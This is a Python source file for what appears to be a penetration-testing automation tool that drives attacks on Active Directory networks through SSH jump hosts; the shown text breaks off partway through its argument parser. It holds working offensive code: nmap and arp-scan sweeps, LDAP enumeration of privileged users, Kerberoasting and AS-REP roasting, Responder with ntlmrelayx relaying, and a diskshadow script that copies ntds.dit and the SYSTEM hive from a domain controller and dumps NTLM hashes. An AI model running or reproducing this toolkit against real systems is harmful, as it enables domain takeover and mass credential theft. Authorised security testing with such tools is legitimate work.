import subprocess
import sys
import argparse
from pathlib import Path
import yaml
import time
import re
import paramiko
from paramiko.config import SSHConfig
import ipaddress

# Cache for open connections
_ssh_connections = {}  
_sftp_connections = {}

def run_ssh_command(hostname, command):
    """Run command on host, maintaining persistent connection"""
    if hostname not in _ssh_connections:
        # Connect if not already connected
        ssh_config = SSHConfig()
        ssh_config_path = Path.home() / '.ssh' / 'config'
        with open(ssh_config_path, 'r') as f:
            ssh_config.parse(f)
        
        cfg = ssh_config.lookup(hostname)
        
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(
            hostname=cfg.get('hostname', hostname),
            port=int(cfg.get('port', 22)),
            username=cfg.get('user'),
            key_filename=cfg.get('identityfile', [None])[0],
            look_for_keys=False
        )
        _ssh_connections[hostname] = ssh
    
    # Run command on existing connection
    stdin, stdout, stderr = _ssh_connections[hostname].exec_command(command)
    output = stdout.read().decode().strip()
    error = stderr.read().decode().strip()

    return output, error

def run_scp_command(hostname, local_path, remote_path, metode):
    # Check if we have an existing connection
    if hostname not in _ssh_connections:
        run_ssh_command(hostname, "echo")  # This will create the connection
    
    if hostname not in _sftp_connections:
        # Get the SFTP client from our existing connection
        sftp = _ssh_connections[hostname].open_sftp()
        _sftp_connections[hostname] = sftp
    
    try:
        if metode == 'get':
            _sftp_connections[hostname].get(remote_path, local_path)

        if metode == 'put':
            _sftp_connections[hostname].put(local_path, remote_path)
    except Exception as e:
        return f'SCP failed: {str(e)}'
    

def close_all_ssh_connections():
    """Close all cached connections"""
    for hostname, conn in _ssh_connections.items():
        conn.close()
    _ssh_connections.clear()

    for hostname, conn in _sftp_connections.items():
        conn.close()
    _sftp_connections.clear()
    
class Color:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    END = '\033[0m'

def color_text(text: str, color: str) -> str:
    """Return colored text if output is a terminal, otherwise plain text."""
    return f"{color}{text}{Color.END}" if sys.stdout.isatty() else text

def check_ssh_config(host):
    """Check if the host exists in SSH config"""
    ssh_config = Path.home() / '.ssh' / 'config'

    if not ssh_config.exists():
        return False

    with open(ssh_config, 'r') as f:
        for line in f:
            if line.strip().lower().startswith('host ') and host in line.lower():
                return True
    return False

def load_config(yaml_file):
    """Load and validate YAML configuration"""
    try:
        with open(yaml_file, 'r') as f:
            config = yaml.safe_load(f)
    except FileNotFoundError:
        sys.exit(f"Error: Config file {yaml_file} not found")
    except yaml.YAMLError as e:
        sys.exit(f"Error in YAML file: {e}")

    # Validate required fields
    if 'hosts' not in config:
        raise ValueError("Configuration must contain 'hosts' section")

    for host_config in config['hosts']:
        if 'name' not in host_config:
            raise ValueError("Each host must have a 'name'")
        if 'scans' not in host_config or not host_config['scans']:
            raise ValueError(f"Host {host_config['name']} must have at least one scan")

        # print(host_config['interfaces'])
        for scan in host_config['scans']:
            if 'target' not in scan:
                raise ValueError("Each scan must have a 'target'")

    return config

def process_host(config_file, live=False):

    scan_files = {}

    

    if not live:
        for host_config in config_file['hosts']:
            host_name = host_config['name']
            scans = host_config['scans']
            ifs = []

            run_ssh_command(host_name, 'mkdir lazy-tool')
            run_ssh_command(host_name, 'mkdir lazy-tool/segtest-nmaps')

            if host_config.get('interfaces'):
                temp = host_config.get('interfaces')
                for item in temp.split(','):
                    ifs.append(item.strip())

            default_tcp = host_config.get('tcp', '-dd -n -T4 -sS -p- --min-rate=200 --traceroute --reason')
            default_udp = host_config.get('udp', '-dd -n -T4 -sU -sV --min-rate=1000 --traceroute --reason')

            scan_file = ''
            for scan in scans:
                sources = []
                if scan.get('source'):
                    temp = scan.get('source')
                    for item in temp.split(','):
                        sources.append(item.strip())

                to = '.'.join(scan.get('target').split('.')[:-1])
                
                if len(sources) > 1:
                    for eth in sources:
                        if len(scan_file) == 0:
                            scan_file = f"sudo nmap -e {eth} {scan.get('tcp', default_tcp)} -oA lazy-tool/segtest-nmaps/{host_name}.{eth}-to-{to}.tcp {scan['target']}"
                            scan_file += f"\nsudo nmap -e {eth} {scan.get('udp', default_udp)} -oA lazy-tool/segtest-nmaps/{host_name}.{eth}-to-{to}.udp {scan['target']}"
                        else:
                            scan_file += f"\nsudo nmap -e {eth} {scan.get('tcp', default_tcp)} -oA lazy-tool/segtest-nmaps/{host_name}.{eth}-to-{to}.tcp {scan['target']}"
                            scan_file += f"\nsudo nmap -e {eth} {scan.get('udp', default_udp)} -oA lazy-tool/segtest-nmaps/{host_name}.{eth}-to-{to}.udp {scan['target']}"

                else:
                    if len(scan_file) == 0:
                        scan_file = f"sudo nmap {scan.get('tcp', default_tcp)} -oA lazy-tool/segtest-nmaps/{host_name}-to-{to}.tcp {scan['target']}"
                        scan_file += f"\nsudo nmap {scan.get('udp', default_udp)} -oA lazy-tool/segtest-nmaps/{host_name}-to-{to}.udp {scan['target']}"
                    else:
                        scan_file += f"\nsudo nmap {scan.get('tcp', default_tcp)} -oA lazy-tool/segtest-nmaps/{host_name}-to-{to}.tcp {scan['target']}"
                        scan_file += f"\nsudo nmap {scan.get('udp', default_udp)} -oA lazy-tool/segtest-nmaps/{host_name}-to-{to}.udp {scan['target']}"
            scan_files[host_name]= scan_file            


    else:
        live_ips = {}

        nmap_scans = {}
        
        for host in config_file['hosts']:
            # check if arp-scan is installed
            arp = run_ssh_command(host['name'], 'which arp-scan')

            if 'not found' in arp[0]:
                print('arp-scan not installed on host.', host)
                exit()

        
        #grabbing live IPs
        for host_config in config_file['hosts']:
            host_name = host_config['name']
            scans = host_config['scans']
            ifs = []
            live_ips[host_name] = {}

            run_ssh_command(host_name, 'mkdir lazy-tool')
            

            if host_config.get('interfaces'):
                temp = host_config.get('interfaces')
                for item in temp.split(','):
                    ifs.append(item.strip())
            else:
                print('Interfaces not defined on the host!', host_name)
                exit()
            
            # create local directory
            create_local_dir = ['mkdir', f'{host_name}-live']
            create = subprocess.run(create_local_dir, capture_output=True, text=True)

            # create remote directory
            run_ssh_command(host_name, 'mkdir lazy-tool/segtest-live')

            arp_parse = r"awk '/^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/ {print $1}'"

            awk = "awk '{print $3}'"
            # grab all live IPs with arp-scan on each interface
            for eth in ifs:
                run_ssh_command(host_name, f'sudo arp-scan -I {eth} --localnet | {arp_parse} > lazy-tool/segtest-live/{host_name}.{eth}.live')
                # print(f'sudo arp-scan -I {eth} --localnet | {arp_parse} > segtest-live/{host_name}.{eth}.live')
                ip = run_ssh_command(host_name, f"ip -4 -br a | grep {eth} | {awk} | cut -d '/' -f 1")
                live_ips[host_name][eth] = [ ip[0], f'{host_name}-live/{host_name}.{eth}.live', f'lazy-tool/segtest-live/{host_name}.{eth}.live']
                # print(f"sudo arp-scan -I {eth} --localnet | {parse} ")
                run_scp_command(host_name, f'{host_name}-live/{host_name}.{eth}.live', f'lazy-tool/segtest-live/{host_name}.{eth}.live', 'get')            


        # creating scan files
        for host_config in config_file['hosts']:
            host_name = host_config['name']
            scans = host_config['scans']
            ifs = []
            if host_config.get('interfaces'):
                temp = host_config.get('interfaces')
                for item in temp.split(','):
                    ifs.append(item.strip())

            run_ssh_command(host_name, 'mkdir lazy-tool/segtest-nmaps')

            default_tcp = host_config.get('tcp', '-dd -n -T4 -sS -p- --min-rate=200 --traceroute --reason')
            default_udp = host_config.get('udp', '-dd -n -T4 -sU -sV --min-rate=1000 --traceroute --reason')

            nmap_scans[host_name] = []

            for scan in scans:
                sources = []
                if scan.get('source'):
                    temp = scan.get('source')
                    for item in temp.split(','):
                        sources.append(item.strip())

                to = scan.get('target-network-name' ,'.'.join(scan.get('target').split('.')[:-1]))

                check, host, eth2, ip = check_network_in_live_ips(live_ips, scan.get('target'))

                # print(check, host, eth2, ip)

                create_local_dir = ['mkdir', f"from-{host_name}-to"]
                create = subprocess.run(create_local_dir, capture_output=True, text=True)

                if check:
                    copy_targets_locally = f"cp {host}-live/{host}.{eth2}.live from-{host_name}-to/."
                    copy = subprocess.run(copy_targets_locally, shell=True, capture_output=True, text=True)

                    # create remote directory and copy targets over
                    run_ssh_command(host_name, 'mkdir lazy-tool/segtest-targets')
                    
                    run_scp_command(host_name, f'from-{host_name}-to/{host}.{eth2}.live', f'segtest-targets/{host}.{eth2}.live', 'put')

                    if scan.get('source'):
                        temp = scan.get('source')
                        for interfaces in temp.split(','):
                            nmap_scans[host_name].append(f"sudo nmap -e {interfaces} {scan.get('tcp', default_tcp)} -oA segtest-nmaps/{host_name}-to-{to}.tcp -iL segtest-targets/{host}.{eth2}.live")
                            nmap_scans[host_name].append(f"sudo nmap -e {interfaces} {scan.get('udp', default_udp)} -oA segtest-nmaps/{host_name}-to-{to}.tcp -iL segtest-targets/{host}.{eth2}.live")

                    else:
                        nmap_scans[host_name].append(f"sudo nmap {scan.get('tcp', default_tcp)} -oA segtest/{host_name}-to-{to}.tcp -iL segtest-targets/{host}.{eth2}.live")
                        nmap_scans[host_name].append(f"sudo nmap {scan.get('udp', default_udp)} -oA segtest/{host_name}-to-{to}.tcp -iL segtest-targets/{host}.{eth2}.live")



                else:
                    if scan.get('source'):
                        temp = scan.get('source')
                        for interfaces in temp.split(','):
                            nmap_scans[host_name].append(f"sudo nmap -e {interfaces} {scan.get('tcp', default_tcp)} -oA segtest/{host_name}-to-{to}.tcp {scan.get('target')}")
                            nmap_scans[host_name].append(f"sudo nmap -e {interfaces} {scan.get('udp', default_udp)} -oA segtest/{host_name}-to-{to}.tcp {scan.get('target')}")

                    else:
                        nmap_scans[host_name].append(f"sudo nmap {scan.get('tcp', default_tcp)} -oA segtest/{host_name}-to-{to}.tcp {scan.get('target')}")
                        nmap_scans[host_name].append(f"sudo nmap {scan.get('udp', default_udp)} -oA segtest/{host_name}-to-{to}.tcp {scan.get('target')}")
                    print('there are no arp scans on this network so will have to scan the whole network.')


                
            
        # print(live_ips)
            
        print(nmap_scans)

    return scan_files

def check_network_in_live_ips(live_ips, network_cidr):
    """Check if a IP falls within the given network"""
    network = ipaddress.ip_network(network_cidr, strict=False)

    for host_name, interfaces in live_ips.items():
        for eth, ip_data in interfaces.items():
            ip = ip_data[0]  # The IP address is the first element in the list
            try:
                ip_obj = ipaddress.ip_address(ip)
                if ip_obj in network:
                    return True, host_name, eth, ip
            except ValueError:
                continue  # Skip invalid IP addresses

    return False, None, None, None
    

def grab_live_ips():
    None

def process_host_live():
    None


# def run_ssh_command(host, command):
#     try:
#         ssh_command = [
#             'ssh',
#             '-F', str(Path.home() / '.ssh/config'),
#             host,
#             command
#         ]
#         result = subprocess.run(ssh_command, capture_output=True, text=True)
#         return (True, result.stdout, result.stderr or "")
#     except subprocess.CalledProcessError as e:
#         return (False, e.stderr)

def copy_files(file1, file2):
    try:
        ssh_command = [
            'scp',
            '-F', str(Path.home() / '.ssh/config'),
            file1,
            file2
        ]
        result = subprocess.run(ssh_command, capture_output=True, text=True)
        return (True, result.stdout)
    except subprocess.CalledProcessError as e:
        return (False, e.stderr)

def validate_access(config):
    # Check required programs
    requirements = {
        'nmap': {
            'cmd': 'command -v nmap',
            'fix': 'sudo apt install -y nmap'
        },
        'tmux': {
            'cmd': 'command -v tmux',
            'fix': 'sudo apt install -y tmux'
        },
        # 'parallel': {
        #     'cmd': 'command -v parallel',
        #     'fix': 'sudo apt install -y parallel'
        # },
        'sudo_nopasswd': {
            'cmd': 'sudo -n true',
            'fix': 'Run "sudo visudo" and add: "$USER ALL=(ALL) NOPASSWD: ALL"'
        }
    }

    for host_config in config['hosts']:
        host_name = host_config['name']
        print(f"\n{color_text('Checking requirements on:', Color.BOLD)} {host_name}")

        # Check requirements
        wrong_stuff = []
        if not check_ssh_config(host_name):
            name = 'ssh config'
            status = color_text("✗", Color.RED)
            print(f"  {status} {name.capitalize().ljust(12)}: {host_name} Missing!")
            sys.exit(1)

        for tool in requirements:
            trial = run_ssh_command(host_name, requirements[tool]['cmd'])

            if tool == 'sudo_nopasswd':
                if len(trial[0]) != 0:
                    wrong_stuff.append(tool)
            else:
                if len(trial[0]) == 0:
                    wrong_stuff.append(tool)

        if wrong_stuff:
            print(color_text("\n  Missing requirements:", Color.YELLOW))
            for item in wrong_stuff:
                print(f" {item}  -  Missing! ")

            if 'nmap' in wrong_stuff or 'tmux' in wrong_stuff or 'parallel' in wrong_stuff:
                print("\n  Install packages with:")
                print(color_text("$ sudo apt update && sudo apt install -y nmap tmux parallel", Color.GREEN))

            if 'sudo_nopasswd' in wrong_stuff:
                print("\n    Configure passwordless sudo with:")
                print(color_text("      $ sudo visudo", Color.GREEN))
                print("    Then add this line (replace USER with your username):")
                print(color_text("      USER ALL=(ALL) NOPASSWD: ALL", Color.GREEN))

        else:
            print(color_text("\n  Requirements met.", Color.GREEN))

        # Show planned scans
        print(color_text("\n  Planned scans:", Color.BOLD))
        for scan in host_config['scans']:
            privileged = scan.get('privileged', False)
            priv_text = color_text(" (privileged)", Color.YELLOW) if privileged else ""
            print(f"    - {scan['target']}{priv_text}")
            print(f"      Command: nmap {scan.get('nmap_args', '-sV -T4')}")
            if privileged and 'sudo_nopasswd' in wrong_stuff:
                print(color_text("      WARNING: Privileged scan requires sudo without password!", Color.RED))

    if not wrong_stuff:
        print(color_text("\nAll requirements are met.", Color.GREEN))
    else:
        print(color_text("\nWARNING: Some requirements are missing. See above for details.", Color.RED))
        exit()

def start_nmaps(scan_file, host):
    # define ssh host
    host_name = host['name']

    # create local directory
    create_local_dir = ['mkdir', f'{host_name}-segtest']
    create = subprocess.run(create_local_dir, capture_output=True, text=True)

    # create remote directory
    run_ssh_command(host_name, 'mkdir segtest')

    # save full commands file locally
    with open(f'{host_name}-segtest/full_nmap.xargs', 'w') as f:
        f.write(scan_file)

    # transfer commands file on the remote
    cp = run_scp_command(host_name, f'{host_name}-segtest/full_nmap.xargs', f'segtest/full_nmap.xargs', 'put')

    try:
        xargs = f'xargs -P {host['parallel']}'
    except:
        xargs = f'xargs -P 2'

    command = 'cat segtest/full_nmap.xargs | '+xargs+' -I {} sh -c "{}"'
    tmux_command = f"tmux new-session -d -s 'nmap-scans' '{command}'"
    execute = run_ssh_command(host_name, tmux_command)

    print(f"\nScan started in tmux session 'nmap_scans' on {host_name}!")
    print(f"Results will be saved to ~/segtest directory on the remote host.")
    print(f"\nTo attach to the tmux session: \nssh {host_name} && tmux attach -t nmap-scans")

def checker(host):
    for targets in host['scans']:
        command = f'tail -n 1 segtest/{targets['scan_name']}*.xml'
        results = run_ssh_command(host['name'], command) 
        print(results[0])
        
def en_users(jh, dc_ip, user, password, domain):
    ldapsearch = run_ssh_command(jh, 'command -v ldapsearch')
    if len(ldapsearch[0]) == 0:
        print('The following tool is missing: ldapsearch')
        exit()

    if '@' not in user:
        user = user+'@'+domain

    domain = domain.split('.')
    dns = ''
    for item in domain:
        if len(dns) == 0:
            dns += 'dc='+item
        else:
            dns += ',dc='+item

    # create remote directory
    create_rem_dir = 'mkdir users-dump'
    create = run_ssh_command(jh, create_rem_dir)
    
    command1 = "ldapsearch -x -H ldap://" + dc_ip + " -D '" + user + "' -w '" + password + "' -E pr=1000/noprompt -b '" + dns + "' '(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' sAMAccountName | grep -E '^sAMAccountName:' | cut -d ':' -f 2 | cut -d ' ' -f 2 > users-dump/enabled_users"

    command2 = "ldapsearch -x -H ldap://" + dc_ip + " -D '" + user + "' -w '" + password + "' -E pr=1000/noprompt -b '" + dns + "' '(|(memberOf=CN=Domain Admins,"+dns+")(memberOf=CN=Enterprise Admins,CN=Users,"+dns+")(memberOf=CN=Schema Admins,CN=Users,"+dns+")(memberOf=CN=Administrators,CN=Builtin,"+dns+"))' sAMAccountName memberOf | grep -E '^sAMAccountName:' | cut -d ':' -f 2 | cut -d ' ' -f 2 > users-dump/high_priv_users"

    command3 =  "ldapsearch -x -H ldap://" + dc_ip + " -D '" + user + "' -w '" + password + "' -E pr=1000/noprompt -b '" + dns + """' '(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' sAMAccountName description | awk 'BEGIN {FS="\\n"; RS=""; OFS=","}{user=""; desc="";for (i=1; i<=NF; i++){if ($i ~ /^sAMAccountName:/) user=substr($i, 17);if ($i ~ /^description:/) desc=substr($i, 13);}print user, desc}' > users-dump/users_descriptions"""

    en = run_ssh_command(jh, command1)
    if len(en[1]) != 0 :
        print(en[1])
        exit()

    print(color_text('Enabled users dumped.\n', Color.GREEN))
    en_adm = run_ssh_command(jh, command2)
    print(color_text('High privilege users gathered!\n', Color.GREEN))
    us_desc = run_ssh_command(jh, command3)
    print(color_text('Users and their description gathered!', Color.GREEN))

    # create local directory
    create_local_dir = ['mkdir', f'users-dump']
    create = subprocess.run(create_local_dir, capture_output=True, text=True)

    run_scp_command(jh, 'users-dump/enabled_users', f'users-dump/enabled_users', 'get')
    run_scp_command(jh, 'users-dump/high_priv_users', f'users-dump/high_priv_users', 'get')
    run_scp_command(jh, 'users-dump/users_descriptions', f'users-dump/users_descriptions', 'get')

def roasting(jh, dc_ip, user, password, domain):
    netexec = run_ssh_command(jh, 'command -v netexec')

    if len(netexec[0]) == 0:
        print('The following tool is missing: netexec')
        exit()

    # create remote directory
    create_rem_dir = 'mkdir roasting'
    create = run_ssh_command(jh, create_rem_dir)

    kerb_cmd = f"netexec ldap {dc_ip} -u '{user.split('@')[0] if '@' in user else user}' -p '{password}' -d {domain} --kdcHost {dc_ip} --kerberoasting roasting/kerberoasted-users"
    asrep_cmd = f"netexec ldap {dc_ip} -u '{user.split('@')[0] if '@' in user else user}' -p '{password}' -d {domain} --kdcHost {dc_ip} --asreproast roasting/asreproasted-users"

    kerb = run_ssh_command(jh, kerb_cmd)

    if len(kerb[1]) != 0:
        print('Some error happened. : \n\n', kerb[1])
        exit()
    print('Performing kerberoasting!')
    asrep = run_ssh_command(jh, asrep_cmd)
    print('Performing ASREPRoasting!')
    
    # create local directory
    create_local_dir = ['mkdir', f'roasting']
    create = subprocess.run(create_local_dir, capture_output=True, text=True)
    
    run_scp_command(jh, 'roasting/kerberoasted-users', 'roasting/kerberoasted-users', 'get')
    run_scp_command(jh, 'roasting/asreproasted-users', 'roasting/asreproasted-users', 'get')

def responder_run(jh, config_file=None):
    if config_file:
        # checking for tools
        tmux = run_ssh_command(jh, 'command -v tmux')
        responder = run_ssh_command(jh, 'command -v responder')
        netexec = run_ssh_command(jh, 'command -v netexec')
        impacket = run_ssh_command(jh, 'command -v impacket-ntlmrelayx')
    
        missing_stuff = []    
        if len(impacket[0]) == 0:
            missing_stuff.append('impacket-ntlmrelayx')
        if len(tmux[0]) == 0:
            missing_stuff.append('tmux')
        if len(responder[0]) == 0:
            missing_stuff.append('responder')
        if len(netexec[0]) == 0:
            missing_stuff.append('netexec')

        if missing_stuff : 
            for item in missing_stuff:
                print(f'The following tool is missing: {item}')
            exit()

        print(color_text('\nGrabbing network interface to listen on...\n', Color.BOLD))
        # grab ethernet interface to listen on
        interface = run_ssh_command(jh, 'ip a')
        interfaces = []
        for line in interface[0].split('\n'):
            if_match = re.match(r'^\d+:\s+([^:]+):\s+<.*UP.*>', line)
            if if_match:
                current_interface = if_match.group(1)
                continue
            # Check for inet line (IPv4 address)
            if current_interface and re.search(r'inet\s+\d+\.\d+\.\d+\.\d+', line):
                interfaces.append(current_interface)
                current_interface = None
        ifp = []
        for iface in interfaces:
            if iface != 'lo' and not iface.startswith(('docker', 'br-', 'veth', 'tun')):
                ifp.append(iface)

        print(color_text('\nGrabbing target list from the config file...\n', Color.BOLD))
        # grab smb signing disabled list
        targets = ''
        for host in config_file['hosts']:
            if host['name'] == jh:
                for scan in host['scans']:
                    targets += scan['target']+'\n'

        # create remote directory
        create_rem_dir = 'mkdir relayx'
        create = run_ssh_command(jh, create_rem_dir)

        print(color_text('\nUploading target list...\n', Color.BOLD))
        # write target list to kali box
        command = f'echo "{targets}" > relayx/scope-signing'
        run_ssh_command(jh, command)

        print(color_text('\nFinding smb signing disabled hosts...', Color.BOLD))
        # start netexec to create no smg signing list
        command = 'netexec smb relayx/scope-signing --gen-relay-list relayx/no-smb-signing.txt'
        run_ssh_command(jh, command)        

        print(color_text('\nMaking sure smb and http are off...', Color.BOLD))
        # turn smb and http off
        smb_off = "sudo sed -i '/^SMB[[:space:]]*=/ s/On/Off/; /^HTTP[[:space:]]*=/ s/On/Off/' /etc/responder/Responder.conf"
        stopping = run_ssh_command(jh, smb_off)

        print(color_text('\nStarting responder...', Color.BOLD))
        # start responder
        command = 'sudo responder -Pv -I '+ifp[0]
        start_resp = run_ssh_command(jh, f"tmux new-session -d -s 'responder' '{command}'")

        print(color_text('\nStarting ntlmrelayx with smb2support and socks...', Color.BOLD))
        # start ntlmrelayx
        command = 'impacket-ntlmrelayx -tf relayx/no-smb-signing.txt -smb2support -socks'
        start_relay =  run_ssh_command(jh, f"tmux new-session -d -s 'ntlmrelayx' '{command}'")

        print(color_text('\nEverything worked well probably! Responder and ntlmrelayx are running!', Color.BOLD))
                
    else:
        # checking for tools
        tmux = run_ssh_command(jh, 'command -v tmux')
        responder = run_ssh_command(jh, 'command -v responder')
        missing_stuff = []    

        if len(tmux[0]) == 0:
            missing_stuff.append('tmux')
        if len(responder[0]) == 0:
            missing_stuff.append('responder')

        if missing_stuff : 
            for item in missing_stuff:
                print(f'The following tool is missing: {item}')
            exit()

        print(color_text('\nGrabbing network interface to listen on...', Color.BOLD))
        interface = run_ssh_command(jh, 'ip a')
        interfaces = []
        for line in interface[0].split('\n'):
            if_match = re.match(r'^\d+:\s+([^:]+):\s+<.*UP.*>', line)
            if if_match:
                current_interface = if_match.group(1)
                continue
            # Check for inet line (IPv4 address)
            if current_interface and re.search(r'inet\s+\d+\.\d+\.\d+\.\d+', line):
                interfaces.append(current_interface)
                current_interface = None
        ifp = []
        for iface in interfaces:
            if iface != 'lo' and not iface.startswith(('docker', 'br-', 'veth', 'tun')):
                ifp.append(iface)

        print(color_text('\nMaking sure smb and http are on...', Color.BOLD))
        # make sure smb and http are on
        smb = "sudo sed -i '/^SMB[[:space:]]*=/ s/Off/On/; /^HTTP[[:space:]]*=/ s/Off/On/' /etc/responder/Responder.conf"
        smb_on = run_ssh_command(jh, smb)

        print(color_text('\nStarting responder...', Color.BOLD))
        # start responder
        command = 'sudo responder -Pv -I '+ifp[0]
        start_resp = run_ssh_command(jh, f"tmux new-session -d -s 'responder' '{command}'")

        print(color_text('\nAll done! If everything worked well responder is running!', Color.GREEN))

def pas_audit(dc_ip, user, password, domain, jh=None, verbose=False):
    powershell_code = r'''
$DiskshadowScript = @"
set context persistent nowriters
set metadata C:\Windows\Temp\meta.cab
set verbose on
add volume c: alias temp
create
expose %temp% z:
exec "C:\Windows\Temp\cop.cmd"
delete shadows volume %temp%
reset
"@ -replace "`n", "`r`n"  # Force CR+LF line endings
    
# create temp directory
    
# Write diskshadow script to temp file
$ScriptPath = "C:\Windows\Temp\ds.txt"
$DiskshadowScript | Out-File -FilePath $ScriptPath -Encoding ASCII
    
$outputFile = "C:\Windows\Temp\diskshadow_output.txt"
    
echo 'copy z:\Windows\NTDS\ntds.dit C:\Windows\Temp\ntds.dit' | out-file C:\Windows\Temp\cop.cmd -encoding ascii
echo 'copy z:\Windows\System32\config\SYSTEM C:\Windows\Temp\copy-system.hive' | out-file C:\Windows\Temp\cop.cmd -encoding ascii -append

# echo 'reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive"' | out-file C:\Windows\Temp\cop.cmd -encoding ascii -append
    
# Run DiskShadow with script and capture output
diskshadow.exe /s $ScriptPath | Tee-Object -FilePath $outputFile
'''
    netexec = run_ssh_command(jh, 'command -v nxc')
    if len(netexec[0]) == 0:
        print(color_text('\nThe following tool is missing: netexec\n',Color.RED))
        print(color_text("If nxc/netexec is actually installed/in path(this problem is usually cause by pipx netexec installs), then fix it by adding it in the global path with this:", Color.BOLD),"\n\necho 'export PATH=$PATH:~/.local/bin' >> ~/.zshenv  # For zsh \nor \necho 'export PATH=$PATH:~/.local/bin' >> ~/.profile # For bash")
        exit()
    smbclient = run_ssh_command(jh, 'command -v smbclient')
    if len(smbclient[0]) == 0:
        print(color_text('The following tool is missing: smbclient\n',Color.RED))

    with open(f'audit.ps1', 'w') as f:
            f.write(powershell_code)
            
    if jh:
        if '@' in user:
            user = user.split('@')[0]

        script2 = run_scp_command(jh, 'audit.ps1', 'audit.ps1', 'put')

        print(color_text('Uploading audit.ps1 file to the target.\n', Color.BOLD))

        command12 = "smbclient //"+dc_ip+"/C$ -U '"+domain+"/"+user+"' --password='"+password+"' -c 'put audit.ps1 Windows/Temp/audit.ps1'"

        cp_audit = run_ssh_command(jh, command12)
        if 'NT_STATUS_LOGON_FAILURE' in cp_audit[0]:
            print(cp_audit[0])
            exit()
        
        time.sleep(1)
        
        command2 =  "nxc winrm "+dc_ip+" -u '"+user+"' -p '"+password+r"' -X 'C:\Windows\Temp\audit.ps1'"

        # create remote directory
        create_rem_dir = 'mkdir ntds'
        create = run_ssh_command(jh, create_rem_dir)
        
        print(color_text('Running diskshadow.\n', Color.BOLD))
        run_audit = run_ssh_command(jh, command2)        
        if verbose:
            print(command2)
            print(run_audit[0])

        command322 = "smbclient //"+dc_ip+"/C$ -U '"+domain+"/"+user+"' --password='"+password+"' -c 'get Windows/Temp/copy-system.hive ntds/copy-system.hive'"
        command333 = "smbclient //"+dc_ip+"/C$ -U '"+domain+"/"+user+"' --password='"+password+"' -c 'get Windows/Temp/ntds.dit ntds/ntds.dit'"

        print(color_text('Diskshadow done, grabbing files over on the jumphost...\n', Color.GREEN))
        jh_grab_audit2 = run_ssh_command(jh, command322)
        jh_grab_audit3 = run_ssh_command(jh, command333)
        if verbose:
            print(command322, '\n',command333,'\n')
            print('\n', jh_grab_audit2[1], '\n', jh_grab_audit3[1], '\n')
        
        # create local directory
        create_local_dir = ['mkdir', 'ntds']
        create = subprocess.run(create_local_dir, capture_output=True, text=True)

        print(color_text('Grabbing files over from jumphost...\n', Color.BOLD))
        
        grab_audit1 = run_scp_command(jh,'ntds/ntds.dit', 'ntds/ntds.dit', 'get')
        grab_audit2 = run_scp_command(jh,'ntds/copy-system.hive', 'ntds/copy-system.hive', 'get')

        print(color_text('Grabbing enabled users and high priv users. If fails only run users module.\n', Color.BOLD))
        users = en_users(jh, dc_ip, user, password, domain)

        print(color_text('\nApparently everything went well?\n', Color.GREEN))        

        if is_tool_installed('impacket-secretsdump'):
            print(color_text('\nDumping the ntlm hashes using impacket-secretsdump locally...\n', Color.BOLD))
             # create local directory
            create_local_dir = ['mkdir', 'ntlms']
            create = subprocess.run(create_local_dir, capture_output=True, text=True)
            command = ['impacket-secretsdump', '-system', 'ntds/copy-system.hive', '-ntds', 'ntds/ntds.dit', '-just-dc-ntlm', '-history', 'LOCAL', '-outputfile', 'ntlms/ntlm-dumps']
            running = subprocess.run(command, capture_output=True, text=True)
            print(color_text('\nNtlm hashes dumped! That was easy, right?', Color.GREEN))

        if is_tool_installed('secretsdump.py'):
            print(color_text('\nDumping the ntlm hashes using secretsdump.py locally...\n', Color.BOLD))
             # create local directory
            create_local_dir = ['mkdir', 'ntlms']
            create = subprocess.run(create_local_dir, capture_output=True, text=True)
            command = ['secretsdump.py', '-system', 'ntds/copy-system.hive', '-ntds', 'ntds/ntds.dit', '-just-dc-ntlm', '-history', 'LOCAL', '-outputfile', 'ntlms/ntlm-dumps']
            running = subprocess.run(command, capture_output=True, text=True)
            print(color_text('\nNtlm hashes dumped! That was easy, right?', Color.GREEN))

        enabled_users_list = None
        with open(f'users-dump/enabled_users', 'r') as f:
            enabled_users_list = set(line.strip().lower() for line in f if line.strip())

        with open('ntlms/ntlm-dumps.ntds', 'r', encoding='utf-8', errors='ignore') as f, open('ntlms/enabled-only-ntlm.ntds', 'w') as out:
            for line in f:
                line = line.strip()

                if not line:
                    continue

                username = line.split(':', 1)[0].lower()

                if '\\' in username:
                    username = username.split('\\')[1]
                if '_history' in username:
                    username = username.split('_history')[0]

                if username in enabled_users_list:
                    out.write(line + '\n')
        
    else:
        print('jumphost not provided, this side of the module is not ready yet so please provide a jumphost :). ')


def is_tool_installed(tool):
    try:
        if subprocess.run(['which', tool], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, check=True).returncode == 0:
            return True
        return False
    except:
        return False
    
def main():
    parser = argparse.ArgumentParser(description="Run nmap scan in tmux on remote host")
    subparsers = parser.add_subparsers(dest="mode", required=True, help="Select a mode")

    launch_parser = subparsers.add_parser("network-scans", help="Launch scans mode")
    launch_parser.add_argument("config_file", help="Path to YAML configuration file")
    launch_parser.add_argument("-live", required=False, action=argparse.BooleanOptionalAction, help="Use this one if you want to scan only live hosts. Using arp-scan")
    launch_parser.add_argument("-printonly", required=False, action=argparse.BooleanOptionalAction, help="Use this if you only want the scans to be printed and not started.")

    monitor_parser = subparsers.add_parser("monitor-scans", help="Monitor scans mode")
    monitor_parser.add_argument("config_file", help="Path to YAML configuration file")
    
    results_parser = subparsers.add_parser("scan-results", help="Show scan results")
    results_parser.add_argument("config_file", help="Path to YAML configuration file")

    
    users_parser = subparsers.add_parser("users", help="Grab all enabled and all high priv users on the target AD domain.")
    users_parser.add_argument("-jumphost", "-jh", required=True, help="SSH host to run the command from")
    users_parser.add_argument("-dc-ip", "-dc", required=True, help="Target DC or AD machine IP")
    users_parser.add_argument("-user", "-u", required=True, help="Active Directory user. Example: admin@marvel.local")
    users_parser.add_argument("-password", "-p", required=True, help="Ehm Password of that user?")
    users_parser.add_argument("-domain", "-d", required=True, help="target domain. Example: marvel.local")

    roasting_parser = subparsers.add_parser("roasting", help="ASREPRoasting and Kerberoasting on the target AD domain.")
